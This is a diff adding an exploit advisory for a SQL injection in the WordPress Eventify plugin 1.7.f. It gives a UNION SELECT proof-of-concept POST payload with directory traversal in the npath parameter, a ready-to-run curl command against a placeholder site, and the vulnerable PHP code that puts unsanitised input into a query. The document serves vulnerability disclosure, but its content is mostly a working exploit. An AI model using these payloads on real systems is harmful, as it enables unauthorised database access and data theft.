@@ -1,0 +1,28 @@
+# Exploit Title: WordPress Eventify - Simple Events plugin <= 1.7.f SQL Injection Vulnerability
+# Date: 2011-09-07
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/eventify.zip
+# Version: 1.7.f (tested)
+# Note: magic_quotes has to be turned off
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/eventify/php/ajax/fetcheventdetails.php
+ npath=../../../../../wp-content&eventid=-1' UNION ALL SELECT 1,2,current_user(),connection_id(),version(),database(),7,8,9--%20
+
+e.g.:
+curl --data "npath=../../../../../wp-content&eventid=-1' UNION ALL SELECT 1,2,current_user(),connection_id(),version(),database(),7,8,9-- " http://www.site.com/wp-content/plugins/eventify/php/ajax/fetcheventdetails.php
+
+---------------
+Vulnerable code
+---------------
+require_once(str_ireplace("/wp-content","",$_POST['npath']).'/wp-load.php');
+$eventid =  $_POST['eventid'];
+$action = "fetch";
+
+if($action=="fetch"){
+    ...
+    $qry= "select * from ".$table_name." where em_id='$eventid'" ;
+    ...
+    $results = $wpdb->get_results($qry);
